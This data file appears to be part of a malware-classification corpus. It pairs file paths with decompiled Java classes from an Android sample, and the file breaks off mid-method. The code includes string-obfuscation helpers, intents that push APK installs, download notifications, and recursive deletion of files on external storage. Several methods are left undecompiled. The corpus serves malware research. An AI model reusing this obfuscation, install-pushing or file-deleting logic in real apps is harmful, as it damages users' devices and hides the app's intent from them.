"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\q.code","public class q extends CountDownTimer {   final p a;   public q(  p pVar,  long j,  long j2){     super(j,j2);     this.a=pVar;   }   @Override public void onFinish(){     this.a.a=true;   }   @Override public void onTick(  long j){   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\r.code","public interface r {   void a(); } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\s.code","public class s extends GridView {   public s(  Context context){     super(context);   }   @Override public void onMeasure(  int i,  int i2){     super.onMeasure(i,View.MeasureSpec.makeMeasureSpec(536870911,Integer.MIN_VALUE));   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\t.code","public class t extends View {   GradientDrawable A;   GradientDrawable B;   GradientDrawable C;   GradientDrawable D;   Paint E;   Paint F;   Rect G;   private int H;   private int I;   private Path J;   private Path K;   private int L;   private int M;   private Bitmap N;   private Canvas O;   private Paint P;   private u Q;   private int R;   private int S;   private int T;   private int U;   private Context V;   private boolean W;   Bitmap a;   Bitmap b;   PointF f34c;   PointF d;   PointF e;   PointF f;   PointF g;   PointF h;   PointF i;   PointF j;   PointF k;   float l;   float m;   float n;   float o;   ColorMatrixColorFilter p;   Matrix q;   float[] r;   boolean s;   float t;   int[] u;   int[] v;   GradientDrawable w;   GradientDrawable x;   GradientDrawable y;   GradientDrawable z;   public t(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     super(context);     this.H=0;     this.I=0;     this.a=null;     this.b=null;     this.f34c=new PointF();     this.d=new PointF();     this.e=new PointF();     this.L=0;     this.M=0;     this.f=new PointF();     this.g=new PointF();     this.h=new PointF();     this.i=new PointF();     this.j=new PointF();     this.k=new PointF();     this.r=new float[]{0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,0.0f,1.0f};     this.t=(float)Math.hypot(this.H,this.I);     this.Q=null;     this.R=0;     this.G=null;     this.U=20;     this.W=true;     this.V=context;     if (aVar == null) {       this.W=false;       return;     }     File file=new File(com.baty.dasy.resy.cac.j.d.b(aVar).getAbsolutePath() + File.separator + com.baty.dasy.resy.cac.j.a.a(72));     File file2=new File(com.baty.dasy.resy.cac.j.d.b(aVar).getAbsolutePath() + File.separator + com.baty.dasy.resy.cac.j.a.a(73));     if (!file.exists() || !file2.exists()) {       this.W=false;       return;     }     this.a=com.baty.dasy.resy.cac.j.i.a(context,file.getAbsolutePath());     this.b=com.baty.dasy.resy.cac.j.i.b(context,file2.getAbsolutePath());     if (this.a == null || this.b == null) {       this.W=false;       return;     }     this.S=this.a.getWidth();     this.T=this.a.getHeight();     this.H=context.getResources().getDisplayMetrics().widthPixels;     this.I=context.getResources().getDisplayMetrics().heightPixels;     if (this.S <= this.H && this.T <= this.I) {       this.G=new Rect(0,0,this.S,this.T);       this.L=this.S;       this.M=0;       this.d.x=this.S;       this.d.y=0.0f;     }  else     if (this.S > this.H || this.T > this.I) {       this.S=this.H;       this.T=this.I;       this.G=new Rect(0,0,this.H,this.I);       this.L=this.S;       this.M=0;       this.d.x=this.S;       this.d.y=0.0f;     }     this.Q=new u(this);     this.J=new Path();     this.K=new Path();     e();     this.N=com.baty.dasy.resy.cac.j.h.a(this.V,this.S,this.T);     if (this.N != null) {       this.O=new Canvas(this.N);       this.P=new Paint(4);       this.E=new Paint();       this.F=new Paint();       this.F.setStyle(Paint.Style.FILL);       ColorMatrix colorMatrix=new ColorMatrix();       colorMatrix.set(new float[]{0.55f,0.0f,0.0f,0.0f,80.0f,0.0f,0.55f,0.0f,0.0f,80.0f,0.0f,0.0f,0.55f,0.0f,80.0f,0.0f,0.0f,0.0f,0.2f,0.0f});       this.p=new ColorMatrixColorFilter(colorMatrix);       this.q=new Matrix();       this.Q.a(true);       this.Q.start();     }   }   private void a(  float f,  float f2){     if ((this.L == 0 && this.M == this.I) || (this.L == this.H && this.M == 0)) {       this.s=true;     }  else {       this.s=false;     }   }   private void a(  Canvas canvas,  Bitmap bitmap){     int i;     int i2;     GradientDrawable gradientDrawable;     this.K.reset();     this.K.moveTo(this.f34c.x,this.f34c.y);     this.K.lineTo(this.i.x,this.i.y);     this.K.lineTo(this.k.x,this.k.y);     this.K.lineTo(this.j.x,this.j.y);     this.K.lineTo(this.L,this.M);     this.K.close();     this.n=(float)Math.toDegrees(Math.atan2(this.f.x - this.L,this.h.y - this.M));     if (this.s) {       i=(int)this.f34c.x;       i2=(int)(this.f34c.x + (this.o / 4.0f));       gradientDrawable=this.w;     }  else {       i=(int)(this.f34c.x - (this.o / 4.0f));       i2=(int)this.f34c.x;       gradientDrawable=this.x;     }     canvas.save();     canvas.clipPath(this.J);     canvas.clipPath(this.K,Region.Op.INTERSECT);     if (bitmap == null) {       return;     }     canvas.drawBitmap(bitmap,(Rect)null,this.G,(Paint)null);     canvas.rotate(this.n,this.f34c.x,this.f34c.y);     gradientDrawable.setBounds(i,(int)this.f34c.y,i2,(int)(this.t + this.f34c.y));     gradientDrawable.draw(canvas);     canvas.restore();   }   private void a(  Canvas canvas,  Bitmap bitmap,  Path path){     this.J.reset();     this.J.moveTo(this.f34c.x,this.f34c.y);     this.J.quadTo(this.f.x,this.f.y,this.g.x,this.g.y);     this.J.lineTo(this.d.x,this.d.y);     this.J.lineTo(this.e.x,this.e.y);     this.J.quadTo(this.h.x,this.h.y,this.j.x,this.j.y);     this.J.lineTo(this.L,this.M);     this.J.close();     canvas.save();     canvas.clipPath(path,Region.Op.XOR);     canvas.drawBitmap(bitmap,(Rect)null,this.G,(Paint)null);     canvas.restore();   }   private void b(  Canvas canvas,  Bitmap bitmap){     int i;     int i2;     GradientDrawable gradientDrawable;     float min=Math.min(Math.abs((((int)(this.f34c.x + this.f.x)) / 2) - this.f.x),Math.abs((((int)(this.j.y + this.h.y)) / 2) - this.h.y));     this.K.reset();     this.K.moveTo(this.k.x,this.k.y);     this.K.lineTo(this.i.x,this.i.y);     this.K.lineTo(this.g.x,this.g.y);     this.K.lineTo(this.d.x,this.d.y);     this.K.lineTo(this.e.x,this.e.y);     this.K.close();     if (this.s) {       i=(int)(this.f34c.x - 1.0f);       i2=(int)(min + this.f34c.x + 1.0f);       gradientDrawable=this.y;     }  else {       i=(int)((this.f34c.x - min) - 1.0f);       i2=(int)(this.f34c.x + 1.0f);       gradientDrawable=this.z;     }     canvas.save();     canvas.clipPath(this.J);     canvas.clipPath(this.K,Region.Op.INTERSECT);     this.F.setColorFilter(this.p);     float hypot=(float)Math.hypot(this.L - this.f.x,this.h.y - this.M);     float f=(this.L - this.f.x) / hypot;     float f2=(this.h.y - this.M) / hypot;     this.r[0]=1.0f - ((2.0f * f2) * f2);     this.r[1]=f2 * 2.0f * f;     this.r[3]=this.r[1];     this.r[4]=1.0f - (f * (2.0f * f));     this.q.reset();     this.q.setValues(this.r);     this.q.preTranslate(-this.f.x,-this.f.y);     this.q.postTranslate(this.f.x,this.f.y);     canvas.drawBitmap(bitmap,this.q,this.F);     this.F.setColorFilter(null);     canvas.rotate(this.n,this.f34c.x,this.f34c.y);     gradientDrawable.setBounds(i,(int)this.f34c.y,i2,(int)(this.f34c.y + this.t));     gradientDrawable.draw(canvas);     canvas.restore();   }   private void d(){     this.l=(this.d.x + this.L) / 2.0f;     this.m=(this.d.y + this.M) / 2.0f;     this.f.x=this.l - (((this.M - this.m) * (this.M - this.m)) / (this.L - this.l));     this.f.y=this.M;     this.h.x=this.L;     this.h.y=this.m - (((this.L - this.l) * (this.L - this.l)) / (this.M - this.m));     this.f34c.x=this.f.x - ((this.L - this.f.x) / 2.0f);     this.f34c.y=this.M;     this.j.x=this.L;     this.j.y=this.h.y - ((this.M - this.h.y) / 2.0f);     this.o=(float)Math.hypot(this.d.x - this.L,this.d.y - this.M);     this.g=a(this.d,this.f,this.f34c,this.j);     this.e=a(this.d,this.h,this.f34c,this.j);     this.i.x=((this.f34c.x + (this.f.x * 2.0f)) + this.g.x) / 4.0f;     this.i.y=(((this.f.y * 2.0f) + this.f34c.y) + this.g.y) / 4.0f;     this.k.x=((this.j.x + (this.h.x * 2.0f)) + this.e.x) / 4.0f;     this.k.y=(((this.h.y * 2.0f) + this.j.y) + this.e.y) / 4.0f;   }   private void e(){     int[] iArr={3355443,-1338821837};     this.z=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,iArr);     this.z.setGradientType(0);     this.y=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,iArr);     this.y.setGradientType(0);     this.u=new int[]{-15658735,1118481};     this.x=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,this.u);     this.x.setGradientType(0);     this.w=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,this.u);     this.w.setGradientType(0);     this.v=new int[]{-2146365167,1118481};     this.C=new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT,this.v);     this.C.setGradientType(0);     this.D=new GradientDrawable(GradientDrawable.Orientation.RIGHT_LEFT,this.v);     this.D.setGradientType(0);     this.B=new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,this.v);     this.B.setGradientType(0);     this.A=new GradientDrawable(GradientDrawable.Orientation.BOTTOM_TOP,this.v);     this.A.setGradientType(0);   }   public PointF a(  PointF pointF,  PointF pointF2,  PointF pointF3,  PointF pointF4){     PointF pointF5=new PointF();     float f=(pointF2.y - pointF.y) / (pointF2.x - pointF.x);     float f2=((pointF.x * pointF2.y) - (pointF2.x * pointF.y)) / (pointF.x - pointF2.x);     pointF5.x=((((pointF3.x * pointF4.y) - (pointF4.x * pointF3.y)) / (pointF3.x - pointF4.x)) - f2) / (f - ((pointF4.y - pointF3.y) / (pointF4.x - pointF3.x)));     pointF5.y=(f * pointF5.x) + f2;     return pointF5;   }   public boolean a(){     return this.W;   }   public void b(){     if (this.R == 0) {       a(this.O,this.a,this.J);       a(this.O,this.b);     }  else {       a(this.O,this.b,this.J);       a(this.O,this.a);     }   }   public void c(){     if (this.d.x > (-this.S) / 2) {       this.U=20;       this.d.x-=10.0f;       this.d.y+=2.0f;     }  else {       this.d.x=this.S;       this.d.y=0.0f;       if (this.R == 0) {         this.U=3000;         this.R=1;       }  else {         this.U=3000;         this.R=0;       }     }     a(this.d.x,this.d.y);   }   @Override protected void onDraw(  Canvas canvas){     canvas.drawColor(-536870912);     this.O.drawColor(-5592406);     d();     b();     b(this.O,this.a);     if (com.baty.dasy.resy.cac.j.a(this.V).a() == null) {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);       return;     }     if (com.baty.dasy.resy.cac.j.a(this.V).a().width >= this.H && com.baty.dasy.resy.cac.j.a(this.V).a().height >= this.I) {       canvas.drawBitmap(this.N,(this.H / 2) - (this.a.getWidth() / 2),(this.I / 2) - (this.a.getHeight() / 2),this.P);     }  else     if (com.baty.dasy.resy.cac.j.a(this.V).a().width >= this.H || com.baty.dasy.resy.cac.j.a(this.V).a().height >= this.I) {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);     }  else {       canvas.drawBitmap(this.N,0.0f,0.0f,this.P);     }   }   @Override protected void onMeasure(  int i,  int i2){     setMeasuredDimension(this.S,this.T);   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.i\u.code","public class u extends Thread {   final t a;   private boolean b=false;   public u(  t tVar){     this.a=tVar;   }   public void a(  boolean z){     this.b=z;   }   @Override public void run(){     int i;     while (this.b) {       try {         this.a.c();         this.a.postInvalidate();         i=this.a.U;         Thread.sleep(i);       }  catch (      InterruptedException e) {         e.printStackTrace();       }     }     super.run();   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\a.code","public class a {   private static Context a;   public static String a(  int i){     return h.d(a,i);   }   public static void a(  Context context){     a=context;   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\b.code","public class b {   private String a=a.a(78);   private File a(){     if (!b()) {       return null;     }     File file=new File(Environment.getExternalStorageDirectory(),this.a);     if (a(file)) {       return file;     }     return null;   }   private void a(  InputStream inputStream){     if (inputStream != null) {       try {         inputStream.close();       }  catch (      IOException e) {         e.printStackTrace();       }     }   }   private void a(  OutputStream outputStream){     if (outputStream != null) {       try {         outputStream.close();       }  catch (      IOException e) {         e.printStackTrace();       }     }   }   private boolean a(  File file){     String parent=file.getParent();     if (parent == null || """".equals(parent)) {       return false;     }     File file2=new File(parent);     if (file2.exists()) {       return true;     }     return file2.mkdirs();   }   private boolean b(){     return ""mounted"".equals(Environment.getExternalStorageState());   }   public boolean a(  String str){     FileInputStream fileInputStream;     File a=a();     if (a == null || !a.exists()) {       return false;     }     try {       fileInputStream=new FileInputStream(a);       try {         try {           BufferedReader bufferedReader=new BufferedReader(new InputStreamReader(fileInputStream));           while (true) {             String readLine=bufferedReader.readLine();             if (readLine == null) {               a(fileInputStream);               return false;             }             try {               String[] split=readLine.split(""="");               if (split.length == 2 && str.equals(split[0])) {                 a(fileInputStream);                 return true;               }             }  catch (            Exception e) {             }           }         }  catch (        Exception e2) {           a(fileInputStream);           return false;         }       }  catch (      Throwable th) {         th=th;         a(fileInputStream);         throw th;       }     }  catch (    Exception e3) {       fileInputStream=null;     } catch (    Throwable th2) {       th=th2;       fileInputStream=null;     }   }   public void b(  String str){     FileOutputStream fileOutputStream;     File a=a();     if (a == null) {       return;     }     FileOutputStream fileOutputStream2=null;     try {       fileOutputStream=new FileOutputStream(a,true);     }  catch (    Exception e) {       fileOutputStream=null;     } catch (    Throwable th) {       th=th;     }     try {       BufferedWriter bufferedWriter=new BufferedWriter(new OutputStreamWriter(fileOutputStream));       StringBuilder sb=new StringBuilder();       sb.append(str).append(""="").append(System.currentTimeMillis()).append(""\n"");       bufferedWriter.write(sb.toString());       bufferedWriter.flush();       a(fileOutputStream);     }  catch (    Exception e2) {       a(fileOutputStream);     } catch (    Throwable th2) {       fileOutputStream2=fileOutputStream;       th=th2;       a(fileOutputStream2);       throw th;     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\c.code","public class c {   private int a;   private int b;   public c(  int i){     this.a=i;     if (i == 1) {       this.b=3;     }  else {       this.b=3;     }   }   private void a(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     if (this.a == 1) {       aVar.x=4;       d.e(context,aVar);       new com.baty.dasy.resy.cac.e.b().a(context,1);     }  else {       aVar.x=4;       d.f(context,aVar);       new com.baty.dasy.resy.cac.e.b().a(context,2);     }   }   private void b(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     Intent d=d.d(context,aVar.f);     Notification notification=new Notification(R.drawable.ic_menu_agenda,"""",System.currentTimeMillis());     String a=a.a(35);     int i=aVar.e;     if (d == null) {       d=new Intent();     }     q.a(context,notification,a,i,16,d,aVar.d,-1);   }   public void a(  Context context){     File b;     com.baty.dasy.resy.cac.c.a[] i=this.a == 1 ? d.i(context) : d.j(context);     if (i == null) {       return;     }     b bVar=new b();     for (    com.baty.dasy.resy.cac.c.a aVar : i) {       if (d.j(context,aVar.f) && aVar.x == this.b && (b=j.b(aVar)) != null && b.exists()) {         String str=aVar.f;         boolean a=bVar.a(str);         b(context,aVar);         b.delete();         a(context,aVar);         if (!a) {           bVar.b(str);         }       }     }   } } "
"msc_data/decompiled_malware_class/0007DB1488BE0F1AE760BD9FEC68153DDEC6D692F3371A395D9F8822FFEC0935\com.baty.dasy.resy.cac.j\d.code","public class d {   private static final String d=a.a(112);   private static final Pattern e=Pattern.compile(a.a(113));   static Object a=new Object();   static Object b=new Object();   private static Object f=new Object();   static Object f36c=new Object();   public static int a(  Context context,  int i){     return (int)((context.getResources().getDisplayMetrics().density * i) + 0.5f);   }   protected static int a(  Context context,  String str,  int i){     BufferedReader bufferedReader;     BufferedReader bufferedReader2=null;     try {       bufferedReader=new BufferedReader(new InputStreamReader(context.getAssets().open(str,3)));       try {         i=Integer.valueOf(bufferedReader.readLine()).intValue();         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e2) {           }         }       }  catch (      Exception e3) {         if (bufferedReader != null) {           try {             bufferedReader.close();           }  catch (          IOException e4) {           }         }         return i;       } catch (      Throwable th) {         bufferedReader2=bufferedReader;         th=th;         if (bufferedReader2 != null) {           try {             bufferedReader2.close();           }  catch (          IOException e5) {           }         }         throw th;       }     }  catch (    Exception e6) {       bufferedReader=null;     } catch (    Throwable th2) {       th=th2;     }     return i;   }   public static Intent a(  Context context,  File file){     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setDataAndType(Uri.fromFile(file),""application/vnd.android.package-archive"");     intent.addFlags(268435456);     return intent;   }   public static Intent a(  Context context,  File file,  com.baty.dasy.resy.cac.c.a aVar){     Intent intent=new Intent();     intent.setType(a.a(92));     intent.setFlags(268435456);     intent.setClass(context,com.baty.dasy.resy.cac.h.b);     intent.putExtra(a.a(74),true);     intent.putExtra(a.a(75),file.getAbsolutePath());     intent.putExtra(a.a(36),aVar.c());     return intent;   }   public static Bitmap a(  Context context,  String str,  boolean z){     if (str == null) {       return null;     }     if (z) {       try {         return BitmapFactory.decodeStream(context.getAssets().open(str));       }  catch (      Exception e2) {         return null;       }     }     try {       return BitmapFactory.decodeStream(new FileInputStream(str));     }  catch (    FileNotFoundException e3) {       return null;     } catch (    Exception e4) {       return null;     }   }   public static com.baty.dasy.resy.cac.c.a a(  com.baty.dasy.resy.cac.c.h hVar){     if (hVar == null) {       return null;     }     com.baty.dasy.resy.cac.c.a aVar=new com.baty.dasy.resy.cac.c.a();     aVar.e=hVar.e;     aVar.d=hVar.d;     aVar.f=hVar.f;     aVar.i=hVar.i / 1024;     aVar.x=hVar.B;     aVar.h=hVar.h;     aVar.j=hVar.j;     aVar.a=hVar.a;     aVar.l=hVar.l;     aVar.k=hVar.k;     aVar.y=0;     aVar.o=hVar.z;     aVar.m=hVar.r;     aVar.g=hVar.g;     aVar.f8c=hVar.f11c;     aVar.n=hVar.y;     aVar.b=hVar.b;     return aVar;   }   public static java.lang.String a(  android.content.Context r7){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.d.a(android.content.Context):java.lang.String"");   }   public static String a(  com.baty.dasy.resy.cac.c.a aVar){     String substring=aVar.r.substring(aVar.r.lastIndexOf(""/"") + 1);     substring.trim();     return substring.endsWith(""?"") ? substring.substring(0,substring.length() - 1) : substring;   }   public static String a(  String str){     try {       byte[] bytes=str.getBytes(""utf-8"");       byte[] bytes2=d.getBytes();       StringBuilder sb=new StringBuilder();       for (int i=0; i < bytes.length; i++) {         sb.append(""%"" + ((bytes[i] & 255) + (bytes2[i % bytes2.length] & 255)));       }       return sb.toString();     }  catch (    UnsupportedEncodingException e2) {       e2.printStackTrace();       return str;     }   }   public static void a(  Context context,  Intent intent,  int i,  com.baty.dasy.resy.cac.c.a aVar,  int i2,  boolean z){     int i3=aVar.e + 400000;     String str=aVar.d;     NotificationManager notificationManager=(NotificationManager)context.getSystemService(""notification"");     Notification notification=new Notification(i,a.a(77),System.currentTimeMillis());     notification.setLatestEventInfo(context,a.a(77),str,PendingIntent.getActivity(context,i3,intent,134217728));     if (i2 != -99) {       notification.flags=i2;     }     if (z) {       notification.defaults|=4;       notification.flags|=1;       notification.ledARGB=-16711936;       notification.ledOnMS=500;       notification.ledOffMS=2000;     }     notificationManager.notify(i3,notification);   }   public static void a(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     File a2=j.a(context,aVar);     File b2=j.b(aVar);     if (b2 != null) {       if (b2.exists()) {         k.a(b2,a2);       }  else {         k.a(new File(b2.getPath() + "".tmp""),new File(a2.getPath() + "".tmp""));       }     }     k.a(context,aVar);     com.baty.dasy.resy.cac.b.g gVar=new com.baty.dasy.resy.cac.b.g(aVar.b,a2,1);     gVar.a(q.c(context));     gVar.a((Object)(-2));     a(context,b(context,aVar),R.drawable.stat_sys_download,aVar,-99,false);     q.a(context,gVar,new com.baty.dasy.resy.cac.b.a(context,aVar,null));   }   private static void a(  android.content.Context r5,  java.io.File r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.d.a(android.content.Context, java.io.File, java.lang.String):void"");   }   public static void a(  Context context,  String str,  String str2){     if (str == null || """".equals(str) || str2 == null || """".equals(str2)) {       return;     }     context.startActivity(a(context,new File(str)));   }   public static void a(  android.content.Context r5,  com.baty.dasy.resy.cac.c.b[] r6){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.d.a(android.content.Context, com.baty.dasy.resy.cac.c.b[]):void"");   }   public static void a(  File file){     if (file.exists()) {       for (      File file2 : file.listFiles()) {         if (file2.isFile()) {           file2.delete();         }  else         if (file2.isDirectory()) {           a(file2);           file2.delete();         }       }     }   }   public static boolean a(){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return false;     }     File file=new File(Environment.getExternalStorageDirectory(),a.a(6));     b(file);     return file.delete();   }   public static boolean a(  Context context,  int i,  int i2){     boolean z=false; synchronized (f) {       if (i2 != -1) {         SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(12),0);         SharedPreferences.Editor edit=sharedPreferences.edit();         Iterator<String> it=sharedPreferences.getAll().keySet().iterator();         while (true) {           if (!it.hasNext()) {             edit.putString("""" + i,i2 + "","");             z=edit.commit();             break;           }           String next=it.next();           if (String.valueOf(i).equals(next)) {             String string=sharedPreferences.getString(next,"""");             if (!a(a(string,"",""),"""" + i2)) {               edit.putString(next,string + """" + i2+ "","");             }             z=edit.commit();           }         }       }     }     return z;   }   public static boolean a(  Context context,  String str){     SharedPreferences.Editor edit=context.getSharedPreferences(a.a(5),0).edit();     edit.putString(a.a(3),str);     return edit.commit();   }   private static boolean a(  String[] strArr,  String str){     if (str == null || """".equals(str)) {       return false;     }     for (    String str2 : strArr) {       if (str2 != null && !"""".equals(str2) && str.equals(str2)) {         return true;       }     }     return false;   }   public static String[] a(  String str,  String str2){     int i=0;     if (str == null || str.equals("""") || str2 == null || str2.equals("""")) {       return null;     }     ArrayList arrayList=new ArrayList();     int i2=0;     while (true) {       int indexOf=str.indexOf(str2,i2);       if (indexOf == -1) {         break;       }       arrayList.add(str.substring(i2,indexOf));       i2=str2.length() + indexOf;     }     if (str.length() > i2) {       arrayList.add(str.substring(i2));     }     String[] strArr=new String[arrayList.size()];     ListIterator listIterator=arrayList.listIterator();     while (listIterator.hasNext()) {       strArr[i]=(String)listIterator.next();       i++;     }     return strArr;   }   public static Intent b(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     Intent intent=new Intent(context,(Class<?>)com.baty.dasy.resy.cac.h.b);     intent.setType(a.a(89));     intent.setFlags(268435456);     intent.putExtra(a.a(36),aVar.c());     intent.putExtra(a.a(90),false);     intent.putExtra(a.a(91),true);     return intent;   }   public static File b(  Context context,  String str,  int i){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return null;     }     String str2=a.a(6) + i;     File file=new File(Environment.getExternalStorageDirectory(),str2);     if (!file.exists()) {       file.mkdirs();     }     return new File(Environment.getExternalStorageDirectory(),str2 + ""/"" + str);   }   public static File b(  com.baty.dasy.resy.cac.c.a aVar){     return new File(Environment.getExternalStorageDirectory(),a.a(6) + aVar.e + File.separator+ a.a(69));   }   public static String b(  Context context){     String string=context.getSharedPreferences(a.a(5),0).getString(a.a(3),null);     return !TextUtils.isEmpty(string) ? string : c(context);   }   public static String b(  String str){     if (str == null || str.length() == 0) {       return str;     }     Matcher matcher=e.matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e2) {         e2.printStackTrace();         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=d.getBytes();       for (int i=0; i < bArr.length; i++) {         bArr[i]=(byte)(((Integer)arrayList.get(i)).intValue() - (bytes[i % bytes.length] & 255));       }       return new String(bArr,""utf-8"");     }  catch (    UnsupportedEncodingException e3) {       e3.printStackTrace();       return str;     }   }   private static void b(  File file){     if (file.exists()) {       for (      File file2 : file.listFiles()) {         if (file2.isFile()) {           String name=file2.getName();           if (name.endsWith(a.a(32)) || name.endsWith(a.a(42)) || name.endsWith(a.a(70))) {             file2.delete();           }         }  else         if (file2.isDirectory()) {           b(file2);           file2.delete();         }       }     }   }   public static boolean b(  Context context,  int i,  int i2){     boolean z=false; synchronized (b) {       if (i2 != -1) {         SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(9),0);         SharedPreferences.Editor edit=sharedPreferences.edit();         Iterator<String> it=sharedPreferences.getAll().keySet().iterator();         while (true) {           if (!it.hasNext()) {             edit.putString("""" + i,i2 + "","");             z=edit.commit();             break;           }           String next=it.next();           if (String.valueOf(i).equals(next)) {             String string=sharedPreferences.getString(next,"""");             if (!a(a(string,"",""),"""" + i2)) {               edit.putString(next,string + """" + i2+ "","");             }             z=edit.commit();           }         }       }     }     return z;   }   public static boolean b(  Context context,  String str){     SharedPreferences.Editor edit=context.getSharedPreferences(a.a(5),0).edit();     edit.putString(a.a(4),str);     return edit.commit();   }   public static boolean b(  java.lang.String r6,  java.lang.String r7){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.d.b(java.lang.String, java.lang.String):boolean"");   }   protected static String c(  Context context){     Bundle bundle;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo == null || (bundle=applicationInfo.metaData) == null) {         return null;       }       return bundle.getString(a.a(3));     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return null;     }   }   protected static String c(  Context context,  String str){     Bundle bundle;     try {       ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);       if (applicationInfo == null || (bundle=applicationInfo.metaData) == null) {         return null;       }       return bundle.getString(str);     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();       return null;     }   }   protected static String c(  String str){     FileInputStream fileInputStream;     String str2=null;     if (""mounted"".equals(Environment.getExternalStorageState())) {       File file=new File(Environment.getExternalStorageDirectory(),str);       DataInputStream exists=file.exists();       try {         if (exists != 0) {           try {             fileInputStream=new FileInputStream(file);             try {               exists=new DataInputStream(fileInputStream);               try {                 str2=exists.readUTF();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e2) {                     e2.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e3) {                     e3.printStackTrace();                   }                 }               }  catch (              IOException e4) {                 e=e4;                 e.printStackTrace();                 if (exists != 0) {                   try {                     exists.close();                   }  catch (                  IOException e5) {                     e5.printStackTrace();                   }                 }                 if (fileInputStream != null) {                   try {                     fileInputStream.close();                   }  catch (                  IOException e6) {                     e6.printStackTrace();                   }                 }                 return str2;               }             }  catch (            IOException e7) {               e=e7;               exists=0;             } catch (            Throwable th) {               exists=0;               th=th;               if (exists != 0) {                 try {                   exists.close();                 }  catch (                IOException e8) {                   e8.printStackTrace();                 }               }               if (fileInputStream != null) {                 try {                   fileInputStream.close();                 }  catch (                IOException e9) {                   e9.printStackTrace();                 }               }               throw th;             }           }  catch (          IOException e10) {             e=e10;             exists=0;             fileInputStream=null;           } catch (          Throwable th2) {             exists=0;             fileInputStream=null;             th=th2;           }         }       }  catch (      Throwable th3) {         th=th3;       }     }     return str2;   }   public static boolean c(  Context context,  com.baty.dasy.resy.cac.c.a aVar){     SharedPreferences sharedPreferences=context.getSharedPreferences(a.a(7),0);     if (aVar.e == -1) {       return false;     }     SharedPreferences.Editor edit=sharedPreferences.edit();     if (sharedPreferences.contains("""" + aVar.e)) {       String string=sharedPreferences.getString("""" + aVar.e,null);       if (string != null) {         com.baty.dasy.resy.cac.c.a aVar2=new com.baty.dasy.resy.cac.c.a();         if (aVar2.a(string)) {           aVar.x=aVar2.x;           edit.putString("""" + aVar.e,aVar.c());         }       }     }  else {       edit.putString("""" + aVar.e,aVar.c());     }     return edit.commit();   }   public static boolean c(  java.lang.String r9,  java.lang.String r10){     throw new UnsupportedOperationException(""Method not decompiled: com.baty.dasy.resy.cac.j.d.c(java.lang.String, java.lang.String):boolean"");   }   public static int d(  Context context){     return a(context,a.a(33),100061);   }   public static Intent d(  Context context,  String str){     ResolveInfo resolveInfo;     if (str == null || str.trim().equals("""")) {       return null;     }     PackageManager packageManager=context.getPackageManager();     Intent intent=new Intent(""android.intent.action.MAIN"",(Uri)null);     intent.addCategory(""android.intent.category.LAUNCHER"");     List<ResolveInfo> queryIntentActivities=packageManager.queryIntentActivities(intent,0);     if (queryIntentActivities != null) {       int size=queryIntentActivities.size();       for (int i=0; i < size; i++) {         resolveInfo=queryIntentActivities.get(i);         if (str.equals(resolveInfo.activityInfo.packageName)) {           break;         }       }     }     resolveInfo=null;     if (resolveInfo == null) {       return null;     }     ComponentName componentName=new ComponentName(str,resolveInfo.activityInfo.name);     Intent intent2=new Intent();     intent2.setComponent(componentName);     intent2.setFlags(268435456);     return intent2;   }   public static String d(  String str){     return str.substring(str.lastIndexOf(""/"") + 1) + a.a(68);   }   public static boolean d(  Context 